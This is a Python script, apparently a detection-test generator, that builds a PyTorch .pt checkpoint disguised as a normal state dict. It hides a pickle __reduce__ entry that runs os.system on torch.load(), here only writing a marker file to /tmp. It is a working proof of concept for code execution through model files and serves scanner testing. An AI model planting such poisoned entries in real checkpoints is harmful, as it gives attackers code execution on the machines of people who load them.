"""Build a TorchScript (.pt) file that uses unsafe pickle opcodes.

PyTorch's torch.save() uses pickle under the hood. An attacker can craft a
.pt file containing a GLOBAL/REDUCE opcode sequence that invokes arbitrary
Python functions on torch.load(). Defender for AI Services flags these
opcodes even when they're wrapped in PyTorch's ZIP container.

This payload wraps a malicious pickle inside a legitimate-looking state dict.
"""
from __future__ import annotations

import os
import pickle
from pathlib import Path

try:
    import torch
except ImportError as exc:  # pragma: no cover
    raise SystemExit(
        "torch is required. Install with: pip install torch --index-url https://download.pytorch.org/whl/cpu"
    ) from exc


class UnsafeOp:
    def __reduce__(self):
        return (os.system, ("echo 'torch.load triggered RCE' > /tmp/defender-ai-model-security-TORCH-PWNED",))


def main(out_dir: Path) -> None:
    out_dir.mkdir(parents=True, exist_ok=True)

    # Build a state dict that looks like a normal PyTorch checkpoint.
    state_dict = {
        "model.fc.weight": torch.randn(10, 5),
        "model.fc.bias": torch.randn(10),
        # The poisoned entry — torch.load() will unpickle this.
        "_metadata": UnsafeOp(),
    }

    out_path = out_dir / "unsafe_torchscript.pt"
    torch.save(state_dict, out_path)
    print(f"Wrote {out_path} ({out_path.stat().st_size} bytes)")


if __name__ == "__main__":
    main(Path(__file__).resolve().parent / "artifacts")
